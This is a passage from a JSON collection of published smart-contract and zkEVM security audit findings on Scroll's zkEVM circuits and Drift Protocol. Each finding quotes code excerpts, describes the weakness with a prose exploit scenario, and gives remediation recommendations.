        "body": "The codebase contains code that is also present in the halo2-lib codebase (not through a dependency) and it does not match in all cases. For example, the several constraint_builder functions use the debug_assert!() macro for important validations, which will not perform those checks in release mode. pub(crate) fn condition<R>( &mut self, condition: Expression<F>, constraint: impl FnOnce(&mut Self) -> R, ) -> R { debug_assert!( self.condition.is_none(), \"Nested condition is not supported\" ); self.condition = Some(condition); let ret = constraint(self); self.condition = None; ret } Figure 6.1: evm_circuit/util/constraint_builder.rs#L216-L229 pub(crate) fn validate_degree(&self, degree: usize, name: &'static str) { if self.max_degree > 0 { debug_assert!( degree <= self.max_degree, \"Expression {} degree too high: {} > {}\", name, degree, self.max_degree, ); } } Figure 6.2: evm_circuit/util/constraint_builder.rs#L246-L256 pub(crate) fn validate_degree(&self, degree: usize, name: &'static str) { // We need to subtract IMPLICIT_DEGREE from MAX_DEGREE because all expressions // will be multiplied by state selector and q_step/q_step_first // selector. debug_assert!( degree <= MAX_DEGREE - IMPLICIT_DEGREE, \"Expression {} degree too high: {} > {}\", name, degree, MAX_DEGREE - IMPLICIT_DEGREE, ); } Figure 6.3: evm_circuit/util/constraint_builder.rs#L1370-L1381 The codebase also includes the log2_ceil function in zkevm-circuits/src/util.rs, which miscomputes its result on a zero inputthe behavior has been xed in PR #37 for halo2-lib. Recommendations Short term, x the issues in common with the halo2-lib codebase. Also, check all uses of debug_assert throughout the codebase and ensure that they are not used to validate critical invariants, as they will not run in release mode. Long term, minimize duplicate code by refactoring the constraint builder codebase.",
        "labels": [
            "Trail of Bits",
            "Severity: Medium",
            "Difficulty: High"
        ]
    },
    {
        "title": "8. RW table constants must match exactly when the verication key is created ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-04-scroll-zkEVM-wave1-securityreview.pdf",
        "body": "Nearly all runtime state of EVM program execution is tracked and validated in a lookup table referred to as the RW table. This table enforces correct initialization and coherency of read and write operations for addressable parts of the state, including the stack, memory, and account storage, as well as inputs and outputs such as the transaction access list and the transaction log. Figure 8.1 shows the storage types combined in this table: pub enum RwTableTag { /// Start (used for padding) Start = 1, /// Stack operation Stack, /// Memory operation Memory, /// Account Storage operation AccountStorage, /// Tx Access List Account operation TxAccessListAccount, /// Tx Access List Account Storage operation TxAccessListAccountStorage, /// Tx Refund operation TxRefund, /// Account operation Account, /// Call Context operation CallContext, /// Tx Log operation TxLog, /// Tx Receipt operation TxReceipt, } Figure 8.1: zkevm-circuits/src/table.rs#354377 The zkEVM circuit enforces correct memory operation results for EVM opcodes by performing lookups into this table, as shown in gure 8.2. Calls such as memory_lookup are translated into Lookup::Rw values (shown in gure 8.3), which are then further translated into multi-column lookups into the RW table, as illustrated in gure 8.4. Note that in lookups, the rst column, corresponding to the xed column q_enable, is always set to 1. cb.condition(is_mstore8.expr(), |cb| { cb.memory_lookup( 1.expr(), from_bytes::expr(&address.cells), value.cells[0].expr(), None, ); }); Rw { Figure 8.2: A memory lookup (zkevm-circuits/src/evm_circuit/execution/memory.rs#7380) /// Counter for how much read-write have been done, which stands for /// the sequential timestamp. counter: Expression<F>, /// A boolean value to specify if the access record is a read or write. is_write: Expression<F>, /// Tag to specify which read-write data to access, see RwTableTag for /// all tags. tag: Expression<F>, /// Values corresponding to the tag. values: RwValues<F>, }, Figure 8.3: Lookup::Rw (zkevm-circuits/src/evm_circuit/table.rs#197208) Self::Rw { counter, is_write, tag, values, } => { vec![ 1.expr(), counter.clone(), is_write.clone(), tag.clone(), values.id.clone(), values.address.clone(), values.field_tag.clone(), values.storage_key.clone(), values.value.clone(), values.value_prev.clone(), values.aux1.clone(), values.aux2.clone(), ] } Figure 8.4: Conversion to lookup columns, with q_enable highlighted (zkevm-circuits/src/evm_circuit/table.rs#321341) However, these lookups enforce only the existence of such rows, and for correct execution, it is vital that the reads and writes present in the table are the following:  Coherent with the external state: The rst read of any data is correctly initialized, and the last write of externally visible data (e.g., storage) is reected in the Ethereum state commitment.  Coherent with each other: Values in read operations match the most recent written value or the initial value.  Coherent with the execution trace: Every entry in the RW table corresponds to exactly one memory-access-generating step in the execution trace. Equivalently, there are no extra entries in the table. These global constraints on the RW table are enforced through three major checks. First, the RW table is lexicographically ordered with respect to its columns. Several constraints are used to enforce lexicographic ordering. An illustrative example is shown in gure 8.5. Note that the constraint is conditional on the xed column selector. All other lexicographic ordering constraints are also conditional on this xed column, so any rows where selector == 0 are not required to be ordered. meta.create_gate(\"limb_difference is not zero\", |meta| { let selector = meta.query_fixed(selector, Rotation::cur()); let limb_difference = meta.query_advice(limb_difference, Rotation::cur()); let limb_difference_inverse = meta.query_advice(limb_difference_inverse, Rotation::cur()); vec![selector * (1.expr() - limb_difference * limb_difference_inverse)] }); Figure 8.5: A lexicographic ordering constraint (zkevm-circuits/src/state_circuit/lexicographic_ordering.rs#128134) Second, a large collection of structural properties on the sorted table are enforced. Figures 8.6 and 8.7 show examples of such constraints. When the rows are sorted, all operations involving the same address or storage identier are grouped together, sorted in increasing order by the nal two columns, which represent the value rw_counter in big-endian. Note that increasing values of rw_counter are treated as happening later in time, as shown in the highlighted portion of gure 8.6, which enforces that reads do not change the value by requiring that value == value_prev in read entries. Unlike in other parts of the table, the constraints applied to Start rows (illustrated in gure 8.7) use the rw_counter elds for a dierent purpose. Every Start row where lexicographic_ordering_selector == 1 is required to exactly increase rw_counter by 1. Start rows do not represent memory operations, and thus can be thought of as padding. // When all the keys in the current row and previous row are equal. self.condition(q.not_first_access.clone(), |cb| { cb.require_zero( \"non-first access reads don't change value\", q.is_read() * (q.rw_table.value.clone() - q.rw_table.value_prev.clone()), ); cb.require_zero( \"initial value doesn't change in an access group\", q.initial_value.clone() - q.initial_value_prev(), ); }); Figure 8.6: A structural constraint on the RW table (zkevm-circuits/src/state_circuit/constraint_builder.rs#177187) self.require_zero(\"field_tag is 0 for Start\", q.field_tag()); self.require_zero(\"address is 0 for Start\", q.rw_table.address.clone()); self.require_zero(\"id is 0 for Start\", q.id()); self.require_zero(\"storage_key is 0 for Start\", q.rw_table.storage_key.clone()); // 1.1. rw_counter increases by 1 for every non-first row self.require_zero( \"rw_counter increases by 1 for every non-first row\", q.lexicographic_ordering_selector.clone() * (q.rw_counter_change() - 1.expr()), ); Figure 8.7: Some constraints applied to Start rows (zkevm-circuits/src/state_circuit/constraint_builder.rs#192200) Third, a running count of RW lookups is tracked in the rw_counter eld of StepState (shown in gure 8.8) for each step. When execution reaches the EndBlock state, two additional lookups are performed, shown in gure 8.9. These lookups ensure that there are max_rws - step.rw_counter padding rows in the RW table, and are designed to check that there are at most step.rw_counter non-padding rows in the table. pub(crate) struct StepState<F> { /// The execution state selector for the step pub(crate) execution_state: DynamicSelectorHalf<F>, /// The Read/Write counter pub(crate) rw_counter: Cell<F>, Figure 8.8: StepState and its rw_counter eld (zkevm-circuits/src/evm_circuit/step.rs#456460) // 3. Verify rw_counter counts to the same number of meaningful rows in // rw_table to ensure there is no malicious insertion. // Verify that there are at most total_rws meaningful entries in the rw_table cb.rw_table_start_lookup(1.expr()); cb.rw_table_start_lookup(max_rws.expr() - total_rws.expr()); // Since every lookup done in the EVM circuit must succeed and uses // a unique rw_counter, we know that at least there are // total_rws meaningful entries in the rw_table. // We conclude that the number of meaningful entries in the rw_table // is total_rws. Figure 8.9: Constraints ensuring that the RW table has been padded to max_rws rows (zkevm-circuits/src/evm_circuit/execution/end_block.rs#7887) These checks are sucient to guarantee RW table correctness, assuming the following:",
        "labels": [
            "Trail of Bits",
            "Severity: Informational",
            "Difficulty: N/A"
        ]
    },
    {
        "title": "28. The EXTCODECOPY opcode implementation does not work when the account address does not exist ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-04-scroll-zkEVM-wave1-securityreview.pdf",
        "body": "The current implementation of the EXTCODECOPY opcode does not consider the case where the account address does not exist. This is documented in a code comment, so the Scroll team should be aware of it. // TODO: If external_address doesn't exist, we will get code_hash = 0. // this value, the bytecode_length lookup will not work, and the copy // from code_hash = 0 will not work. We should use EMPTY_HASH when // code_hash = 0. cb.bytecode_length(code_hash.expr(), code_size.expr()); With Figure 28.1: zkevm-circuits/src/evm_circuit/execution/extcodecopy.rs#8488 Recommendations Short term, implement the missing functionality. Add tests to ensure its correctness. Long term, look for all TODO items in the codebase and triage them into an organized issue tracker. Address these items in terms of priority. A. Vulnerability Categories The following tables describe the vulnerability categories, severity levels, and diculty levels used in this document. Vulnerability Categories Category",
        "labels": [
            "Trail of Bits",
            "Severity: Informational",
            "Difficulty: N/A"
        ]
    },
    {
        "title": "1. Lack of build instructions ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2022-12-driftlabs-driftprotocol-securityreview.pdf",
        "body": "The Drift Protocol repository does not contain instructions to build, compile, test, or run the project. The projects README should include at least the following information:    Instructions for building the project Instructions for running the built artifacts Instructions for running the projects tests The closest thing we have found to build instructions appears in a script in the drift-sim repository (gure 1.1). As shown in the gure below, building the project is non-trivial. Users should not be required to rediscover these steps on their own. git submodule update --init --recursive # build v2 cd driftpy/protocol-v2 yarn && anchor build # build dependencies for v2 cd deps/serum-dex/dex && anchor build && cd ../../.. # go back to top-level cd ../../ Figure 1.1: drift-sim/setup.sh Additionally, the project relies on serum-dex , which currently has an open issue regarding outdated build instructions. Thus, if a user visits the serum-dex repository to learn how to build the dependency, they will be misled. Exploit Scenario Alice attempts to build and deploy her own copy of the Drift Protocol smart contract. Without instructions, Alice deploys it incorrectly. Users of Alices copy of the smart contract suer nancial loss. Recommendations Short term, add the minimal information listed above to the projects README . This will help users to build, run, and test the project . Long term, as the project evolves, ensure that the README is updated. This will help ensure that the README does not communicate incorrect information to users . References  Documentation points to do.sh",
        "labels": [
            "Trail of Bits",
            "Severity: Informational",
            "Difficulty: High"
        ]
    },
    {
        "title": "2. Inadequate testing ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2022-12-driftlabs-driftprotocol-securityreview.pdf",
        "body": "The Anchor tests are not run as part of Drift Protocols CI process. Moreover, the script responsible for running the Anchor tests does not run all of them. Integrating all Anchor tests into the CI process and updating the script so it runs all tests will help ensure they are run regularly and consistently. Figure 2.1 shows a portion of the projects main GitHub workow, which runs the projects unit tests. However, the le makes no reference to the projects Anchor tests. - name : Run unit tests run : cargo test --lib # run unit tests Figure 2.1: .github/workflows/main.yml#L52L53 Furthermore, the script used to run the Anchor tests runs only some of them. The relevant part of the script appears in gure 2.2. The test_files array contains the names of nearly all of the les containing tests in the tests directory. However, the array lacks the following entries, and consequently does not run their tests:  ksolver.ts  tokenFaucet.ts test_files =( postOnlyAmmFulfillment.ts imbalancePerpPnl.ts ... # 42 entries cancelAllOrders.ts ) Figure 2.2: test-scripts/run-anchor-tests.sh#L7L53 Exploit Scenario Alice, a Drift Protocol developer, unwittingly introduces a bug into the codebase. The test would be revealed by the Anchor tests. However, because the Anchor tests are not run in CI, the bug goes unnoticed. Recommendations Short term:   Adjust the main GitHub workow so that it runs the Anchor tests. Adjust the run-anchor-tests.sh script so that it runs all Anchor tests (including those in ksolver.ts and tokenFaucet.ts ). Taking these steps will help to ensure that all Anchor tests are run regularly and consistently. Long term, revise the run-anchor-tests.sh script so that the test_files array is not needed. Move les that do not contain tests into a separate directory, so that only les containing tests remain. Then, run the tests in all les in the tests directory. Adopting such an approach will ensure that newly added tests are automatically run.",
        "labels": [
            "Trail of Bits",
            "Severity: Informational",
            "Difficulty: High"
        ]
    },
    {
        "title": "3. Invalid audit.toml prevents cargo audit from being run ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2022-12-driftlabs-driftprotocol-securityreview.pdf",
        "body": "The projects anchor.toml le contains an invalid key. This makes running cargo audit on the project impossible. The relevant part of the audit.toml le appears in gure 3.1. The packages key is unrecognized by cargo audit . As a result, cargo audit produces the error in gure 3.2 when run on the protocol-v2 repository. [packages] source = \"all\" # \"all\", \"public\" or \"local\" Figure 3.1: .cargo/audit.toml#L27L28 error: cargo-audit fatal error: parse error: unknown field `packages`, expected one of `advisories`, `database`, `output`, `target`, `yanked` at line 30 column 1 Figure 3.2: Error produced by cargo audit when run on the protocol-v2 repository Exploit Scenario A vulnerability is discovered in a protocol-v2 dependency. A RUSTSEC advisory is issued for the vulnerability, but because cargo audit cannot be run on the repository, the vulnerability goes unnoticed. Users suer nancial loss. Recommendations Short term, either remove the packages table from the anchor.toml le or replace it with a table recognized by cargo audit . In the projects current state, cargo audit cannot be run on the project. Long term, regularly run cargo audit in CI and verify that it runs to completion without producing any errors or warnings. This will help the project receive the full benets of running cargo audit by identifying dependencies with RUSTSEC advisories.",
        "labels": [
            "Trail of Bits",
            "Severity: Informational",
            "Difficulty: High"
        ]
    },
    {
        "title": "4. Race condition in Drift SDK ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2022-12-driftlabs-driftprotocol-securityreview.pdf",
        "body": "A race condition in the Drift SDK causes client programs to operate on non-existent or possibly stale data. The race condition aects many of the projects Anchor tests, making them unreliable. Use of the SDK in production could have nancial implications. When running the Anchor tests, the error in gure 4.1 appears frequently. The data eld that the error refers to is read by the getUserAccount function (gure 4.2). This function tries to read the data eld from a DataAndSlot object obtained by calling getUserAccountAndSlot (gure 4.3). That DataAndSlot object is set by the handleRpcResponse function (gure 4.4). TypeError: Cannot read properties of undefined (reading 'data') at User.getUserAccount (sdk/src/user.ts:122:56) at DriftClient.getUserAccount (sdk/src/driftClient.ts:663:37) at DriftClient.<anonymous> (sdk/src/driftClient.ts:1005:25) at Generator.next (<anonymous>) at fulfilled (sdk/src/driftClient.ts:28:58) at processTicksAndRejections (node:internal/process/task_queues:96:5) Figure 4.1: Error that appears frequently when running the Anchor tests public getUserAccount(): UserAccount { return this .accountSubscriber.getUserAccountAndSlot(). data ; } Figure 4.2: sdk/src/user.ts#L121L123 public getUserAccountAndSlot(): DataAndSlot<UserAccount> { this .assertIsSubscribed(); return this .userDataAccountSubscriber. dataAndSlot ; } Figure 4.3: sdk/src/accounts/webSocketUserAccountSubscriber.ts#L72L75 handleRpcResponse(context: Context , accountInfo?: AccountInfo <Buffer>): void { ... if (newBuffer && (!oldBuffer || !newBuffer.equals(oldBuffer))) { this .bufferAndSlot = { buffer: newBuffer , slot: newSlot , }; const account = this .decodeBuffer(newBuffer); this .dataAndSlot = { data: account , slot: newSlot , }; this .onChange(account); } } Figure 4.4: sdk/src/accounts/webSocketAccountSubscriber.ts#L55L95 If a developer calls getUserAccount but handleRpcResponse has not been called since the last time the account was updated, stale data will be returned. If handleRpcResponse has never been called for the account in question, an error like that shown in gure 4.1 arises. Note that a developer can avoid the race by calling WebSocketAccountSubscriber.fetch (gure 4.5). However, the developer must manually identify locations where such calls are necessary. Errors like the one shown in gure 4.1 appear frequently when running the Anchor tests, which suggests that identifying such locations is nontrivial. async fetch(): Promise < void > { const rpcResponse = await this .program.provider.connection.getAccountInfoAndContext( this .accountPublicKey, ( this .program.provider as AnchorProvider).opts.commitment ); this .handleRpcResponse(rpcResponse.context, rpcResponse?.value); } Figure 4.5: sdk/src/accounts/webSocketAccountSubscriber.ts#L46L53 We suspect this problem applies to not just user accounts, but any account fetched via a subscription mechanism (e.g., state accounts or perp market accounts). Note that despite the apparent race condition, Drift Protocol states that the tests run reliably for them. Exploit Scenario Alice, unaware of the race condition, writes client code that uses the Drift SDK. Alices code unknowingly operates on stale data and proceeds with a transaction, believing it will result in nancial gain. However, when processed with actual on-chain data, the transaction results in nancial loss for Alice. Recommendations Short term, rewrite all account getter functions so that they automatically call WebSocketAccountSubscriber.fetch . This will eliminate the need for developers to deal with the race manually. Long term, investigate whether using a subscription mechanism is actually needed. Another Solana RPC call could solve the same problem yet be more ecient than a subscription combined with a manual fetch.",
        "labels": [
            "Trail of Bits",
            "Severity: Undetermined",
            "Difficulty: Low"
        ]
    },
    {
        "title": "5. Loose size coupling between function invocation and requirement ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2022-12-driftlabs-driftprotocol-securityreview.pdf",
        "body": "The implementation of the emit_stack function relies on the caller to use a suciently large buer space to hold a Base64-encoded representation of the discriminator along with the serialized event. Failure to provide sucient space will result in an out-of-bounds attempt on either the write operation or the in the base64::encode_config_slice call. emit_stack::<_, 424 >(order_action_record); Figure 5.1: programs/drift/src/controller/orders.rs#L545 pub fn emit_stack <T: AnchorSerialize + Discriminator, const N: usize >(event: T ) { let mut data_buf = [ 0 u8 ; N]; let mut out_buf = [ 0 u8 ; N]; emit_buffers(event, & mut data_buf[..], & mut out_buf[..]) } pub fn emit_buffers <T: AnchorSerialize + Discriminator>( event: T , data_buf: & mut [ u8 ], out_buf: & mut [ u8 ], ) { let mut data_writer = std::io::Cursor::new(data_buf); data_writer .write_all(&<T as Discriminator>::discriminator()) .unwrap(); borsh::to_writer(& mut data_writer, &event).unwrap(); let data_len = data_writer.position() as usize ; let out_len = base64::encode_config_slice( &data_writer.into_inner()[ 0 ..data_len], base64::STANDARD, out_buf, ); let msg_bytes = &out_buf[ 0 ..out_len]; let msg_str = unsafe { std:: str ::from_utf8_unchecked(msg_bytes) }; msg!(msg_str); } Figure 5.2: programs/drift/src/state/events.rs#L482L511 Exploit Scenario A maintainer of the smart contract is unaware of this implicit size requirement and adds a call to emit_stack using too small a buer, or changes are made to a type without a corresponding change to all places where emit_stack uses that type. If the changed code is not covered by tests, the problem will manifest during contract operation, and could cause an instruction to panic, thereby reverting the transaction. Recommendations Short term, add a size constant to the type, and calculate the amount of space required for holding the respective buers. This ensures that changes to a type's size can be made throughout the code. Long term, create a trait to be used by the types with which emit_stack is intended to work. This can be used to handle the size of the type, and also any other future requirement for types used by emit_stack .",
        "labels": [
            "Trail of Bits",
            "Severity: Informational",
            "Difficulty: High"
        ]
    },
    {
        "title": "6. The zero-copy feature in Anchor is experimental ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2022-12-driftlabs-driftprotocol-securityreview.pdf",
        "body": "Several structs for keeping state use Anchors zero-copy functionality. The Anchor documentation states that this is still an experimental feature that should be used only when Borsh serialization cannot be used without hitting the stack or heap limits. Exploit Scenario The Anchor framework has a bug in the zero-copy feature, or updates it with a breaking change, in a way that aects the security model of the Drift smart contract. An attacker discovers this problem and leverages it to steal funds from the contract. #[account(zero_copy)] #[derive(Default, Eq, PartialEq, Debug)] #[repr(C)] pub struct User { pub authority: Pubkey , pub delegate: Pubkey , pub name: [ u8 ; 32 ], pub spot_positions: [SpotPosition; 8 ], pub perp_positions: [PerpPosition; 8 ], pub orders: [Order; 32 ], pub last_add_perp_lp_shares_ts: i64 , pub total_deposits: u64 , pub total_withdraws: u64 , pub total_social_loss: u64 , // Fees (taker fees, maker rebate, referrer reward, filler reward) and pnl for perps pub settled_perp_pnl: i64 , // Fees (taker fees, maker rebate, filler reward) for spot pub cumulative_spot_fees: i64 , pub cumulative_perp_funding: i64 , pub liquidation_margin_freed: u64 , // currently unimplemented // currently unimplemented pub liquidation_start_ts: i64 , pub next_order_id: u32 , pub max_margin_ratio: u32 , pub next_liquidation_id: u16 , pub sub_account_id: u16 , pub status: UserStatus , pub is_margin_trading_enabled: bool , pub padding: [ u8 ; 26 ], } Figure 6.1: Example of a struct using zero copy Recommendations Short term, evaluate if it is possible to move away from using zero copy without hitting the stack or heap limits, and do so if possible. Not relying on experimental features reduces the risk of exposure to bugs in the Anchor framework. Long term, adopt a conservative stance by using stable versions of packages and features. This reduces both risk and time spent on maintaining compatibility with code still in ux.",
        "labels": [
            "Trail of Bits",
            "Severity: Informational",
            "Difficulty: High"
        ]
    },
    {
        "title": "7. Hard-coded indices into account data ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2022-12-driftlabs-driftprotocol-securityreview.pdf",
        "body": "The implementations for both PerpMarketMap and SpotMarketMap use hard-coded indices into the accounts data in order to retrieve the marked_index property without having to deserialize all the data. // market index 1160 bytes from front of account let market_index = u16 ::from_le_bytes(*array_ref![data, 1160 , 2 ]); Figure 7.1: programs/drift/src/state/perp_market_map.rs#L110L111 let market_index = u16 ::from_le_bytes(*array_ref![data, 684 , 2 ]); Figure 7.2: programs/drift/src/state/spot_market_map.rs#L174 Exploit Scenario Alice, a Drift Protocol developer, changes the layout of the structure or the width of the market_index property but fails to update one or more of the hard-coded indices. Mallory notices this bug and nds a way to use it to steal funds. Recommendations Short term, add consts that include the value of the indices and the type size. Also add comments explaining the calculation of the values. This ensures that by updating the constants, all code relying on the operation will retrieve the correct part of the unlying data. Long term, add an implementation to the struct to unpack the market_index from the serialized state. This reduces the maintenance burden of updating the code that accesses data in this way.",
        "labels": [
            "Trail of Bits",
            "Severity: Informational",
            "Difficulty: High"
        ]
    },
    {
        "title": "8. Missing verication of maker and maker_stats accounts ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2022-12-driftlabs-driftprotocol-securityreview.pdf",
        "body": "The handle_place_and_take_perp_order and handle_place_and_take_spot_order functions retrieve two additional accounts that are passed to the instruction: maker and maker_stats . However, there is no check that the two accounts are linked (i.e., that their authority is the same). Due to time constraints, we were unable to determine the impact of this nding. pub fn get_maker_and_maker_stats <'a>( account_info_iter: & mut Peekable<Iter<AccountInfo<'a>>>, ) -> DriftResult <(AccountLoader<'a, User>, AccountLoader<'a, UserStats>)> { let maker_account_info = next_account_info(account_info_iter).or( Err (ErrorCode::MakerNotFound))?; validate!( maker_account_info.is_writable, ErrorCode::MakerMustBeWritable )?; let maker: AccountLoader <User> = AccountLoader::try_from(maker_account_info).or( Err (ErrorCode::CouldNotDeserializeMak er))?; let maker_stats_account_info = next_account_info(account_info_iter).or( Err (ErrorCode::MakerStatsNotFound))?; validate!( maker_stats_account_info.is_writable, ErrorCode::MakerStatsMustBeWritable )?; let maker_stats: AccountLoader <UserStats> = AccountLoader::try_from(maker_stats_account_info) .or( Err (ErrorCode::CouldNotDeserializeMakerStats))?; Ok ((maker, maker_stats)) } Figure 8.1: programs/drift/src/instructions/optional_accounts.rs#L47L74 Exploit Scenario Mallory passes two unlinked accounts of the correct type in the places for maker and maker_stats , respectively. This causes the contract to operate outside of its intended use. Recommendations Short term, add a check that the authority of the accounts are the same. Long term, add all code for authentication of accounts to the front of instruction handlers. This increases the clarity of the checks and helps with auditing the authentication.",
        "labels": [
            "Trail of Bits",
            "Severity: Undetermined",
            "Difficulty: Medium"
        ]
    },
    {
        "title": "9. Panics used for error handling ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2022-12-driftlabs-driftprotocol-securityreview.pdf",
        "body": "In several places, the code panics when an arithmetic overow or underow occurs. Panics should be reserved for programmer errors (e.g., assertion violations). Panicking on user errors dilutes the utility of the panic operation. An example appears in gure 9.1. The adjust_amm function uses both the question mark operator ( ? ) and unwrap to handle errors resulting from peg related calculations. An overow or underow could result from an invalid input to the function. An error should be returned in such cases. budget_delta_peg = budget_i128 .safe_add(adjustment_cost.abs())? .safe_mul(PEG_PRECISION_I128)? .safe_div(per_peg_cost)?; budget_delta_peg_magnitude = budget_delta_peg.unsigned_abs(); new_peg = if budget_delta_peg > 0 { ... } else if market.amm.peg_multiplier > budget_delta_peg_magnitude { market .amm .peg_multiplier .safe_sub(budget_delta_peg_magnitude) .unwrap() } else { 1 }; Figure 9.1: programs/drift/src/math/repeg.rs#L349L369 Running Clippy with the following command identies 66 locations in the drift package where expect or unwrap is used: cargo clippy -p drift -- -A clippy::all -W clippy::expect_used -W clippy::unwrap_used Many of those uses appear to be related to invalid input. Exploit Scenario Alice, a Drift Protocol developer, observes a panic in the Drift Protocol codebase. Alice ignores the panic, believing that it is caused by user error, but it is actually caused by a bug she introduced. Recommendations Short term, reserve the use of panics for programmer errors. Have relevant areas of the code return Result::Err on user errors. Adopting such a policy will help to distinguish the two types of errors when they occur. Long term, consider denying the following Clippy lints:  clippy::expect_used  clippy::unwrap_used  clippy::panic Although this will not prevent all panics, it will prevent many of them.",
        "labels": [
            "Trail of Bits",
            "Severity: Informational",
            "Difficulty: High"
        ]
    },
    {
        "title": "10. Testing code used in production ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2022-12-driftlabs-driftprotocol-securityreview.pdf",
        "body": "In some locations in the Drift Protocol codebase, testing code is mixed with production code with no way to discern between them. Testing code should be clearly indicated as such and guarded by #[cfg(test)] to avoid being called in production. Examples appear in gures 10.1 and 10.2. The OracleMap struct has a quote_asset_price_data eld that is used only when get_price_data is passed a default Pubkey . Similarly, the AMM implementation contains functions that are used only for testing and are not guarded by #[cfg(test)] . pub struct OracleMap <'a> { oracles: BTreeMap <Pubkey, AccountInfoAndOracleSource<'a>>, price_data: BTreeMap <Pubkey, OraclePriceData>, pub slot: u64 , pub oracle_guard_rails: OracleGuardRails , pub quote_asset_price_data: OraclePriceData , } impl <'a> OracleMap<'a> { ... pub fn get_price_data (& mut self , pubkey: & Pubkey ) -> DriftResult <&OraclePriceData> { if pubkey == &Pubkey::default() { return Ok (& self .quote_asset_price_data); } Figure 10.1: programs/drift/src/state/oracle_map.rs#L22L47 impl AMM { pub fn default_test () -> Self { let default_reserves = 100 * AMM_RESERVE_PRECISION; // make sure tests dont have the default sqrt_k = 0 AMM { Figure 10.2: programs/drift/src/state/perp_market.rs#L490L494 Drift Protocol has indicated that the quote_asset_price_data eld (gure 10.1) is used in production. This raises concerns because there is currently no way to set the contents of this eld, and no assets price is perfectly constant (e.g., even stablecoins prices uctuate). For this reason, we have changed this ndings severity from Informational to Undetermined. Exploit Scenario Alice, a Drift Protocol developer, introduces code that calls the default_test function, not realizing it is intended only for testing. Alice introduces a bug as a result. Recommendations Short term, to the extent possible, avoid mixing testing and production code by, for example, using separate data types and storing the code in separate les. When testing and production code must be mixed, clearly mark the testing code as such, and guard it with #[cfg(test)] . These steps will help to ensure that testing code is not deployed in production. Long term, as new code is added to the codebase, ensure that the aforementioned standards are maintained. Testing code is not typically held to the same standards as production code, so it is more likely to include bugs.",
        "labels": [
            "Trail of Bits",
            "Severity: Undetermined",
            "Difficulty: Undetermined"
        ]
    },
    {
        "title": "11. Inconsistent use of checked arithmetic ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2022-12-driftlabs-driftprotocol-securityreview.pdf",
        "body": "In several locations, the Drift Protocol codebase uses unchecked arithmetic. For example, in calculate_margin_requirement_and_total_collateral_and_liability_info (gure 11.1), the variable num_perp_liabilities is used as an operand in both a checked and an unchecked operation. To protect against overows and underows, unchecked arithmetic should be used sparingly. num_perp_liabilities += 1 ; } with_isolated_liability &= margin_requirement > 0 && market.contract_tier == ContractTier::Isolated; } if num_spot_liabilities > 0 { validate!( margin_requirement > 0 , ErrorCode::InvalidMarginRatio, \"num_spot_liabilities={} but margin_requirement=0\" , num_spot_liabilities )?; } let num_of_liabilities = num_perp_liabilities.safe_add(num_spot_liabilities) ?; Figure 11.1: programs/drift/src/math/margin.rs#L499L515 Note that adding the following to the crate root will cause Clippy to fail the build whenever unchecked arithmetic is used: #![deny(clippy::integer_arithmetic)] Exploit Scenario Alice, a Drift Protocol developer, unwittingly introduces an arithmetic overow bug into the codebase. The bug would have been revealed by the use of checked arithmetic. However, because unchecked arithmetic is used, the bug goes unnoticed. Recommendations Short term, add the #![deny(clippy::integer_arithmetic)] attribute to the drift crate root. Add #[allow(clippy::integer_arithmetic)] in rare situations where code is performance critical and its safety can be guaranteed through other means. Taking these steps will reduce the likelihood of overow or underow bugs residing in the codebase. Long term, if additional Solana programs are added to the codebase, ensure the #![deny(clippy::integer_arithmetic)] attribute is also added to them. This will reduce the likelihood that newly introduced crates contain overow or underow bugs.",
        "labels": [
            "Trail of Bits",
            "Severity: Undetermined",
            "Difficulty: Undetermined"
        ]
    },
    {
        "title": "12. Inconsistent and incomplete exchange status checks ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2022-12-driftlabs-driftprotocol-securityreview.pdf",
        "body": "Drift Protocols representation of the exchanges status has several problems:    The exchanges status is represented using an enum , which does not allow more than one individual operation to be paused (gures 12.1 and 12.2). As a result, an administrator could inadvertently unpause one operation by trying to pause another (gure 12.3). The ExchangeStatus variants do not map cleanly to exchange operations. For example, handle_transfer_deposit checks whether the exchange status is WithdrawPaused (gure 12.4). The functions name suggests that the function checks whether transfers or deposits are paused. The ExchangeStatus is checked in multiple inconsistent ways. For example, in handle_update_funding_rate (gure 12.5), both an access_control attribute and the body of the function include a check for whether the exchange status is FundingPaused . pub enum ExchangeStatus { Active, FundingPaused, AmmPaused, FillPaused, LiqPaused, WithdrawPaused, Paused, } Figure 12.1: programs/drift/src/state/state.rs#L36L44 #[account] #[derive(Default)] #[repr(C)] pub struct State { pub admin: Pubkey , pub whitelist_mint: Pubkey , ... pub exchange_status: ExchangeStatus , pub padding: [ u8 ; 17 ], } Figure 12.2: programs/drift/src/state/state.rs#L8L33 pub fn handle_update_exchange_status ( ctx: Context <AdminUpdateState>, exchange_status: ExchangeStatus , ) -> Result <()> { ctx.accounts.state.exchange_status = exchange_status; Ok (()) } Figure 12.3: programs/drift/src/instructions/admin.rs#L1917L1923 #[access_control( withdraw_not_paused (&ctx.accounts.state) )] pub fn handle_transfer_deposit ( ctx: Context <TransferDeposit>, market_index: u16 , amount: u64 , ) -> anchor_lang :: Result <()> { Figure 12.4: programs/drift/src/instructions/user.rs#L466L473 #[access_control( market_valid(&ctx.accounts.perp_market) funding_not_paused (&ctx.accounts.state) valid_oracle_for_perp_market(&ctx.accounts.oracle, &ctx.accounts.perp_market) )] pub fn handle_update_funding_rate ( ctx: Context <UpdateFundingRate>, perp_market_index: u16 , ) -> Result <()> { ... let is_updated = controller::funding::update_funding_rate( perp_market_index, perp_market, & mut oracle_map, now, &state.oracle_guard_rails, matches! (state.exchange_status, ExchangeStatus::FundingPaused ), None , )?; ... } Figure 12.5: programs/drift/src/instructions/keeper.rs#L1027L1078 The Medium post describing the incident that 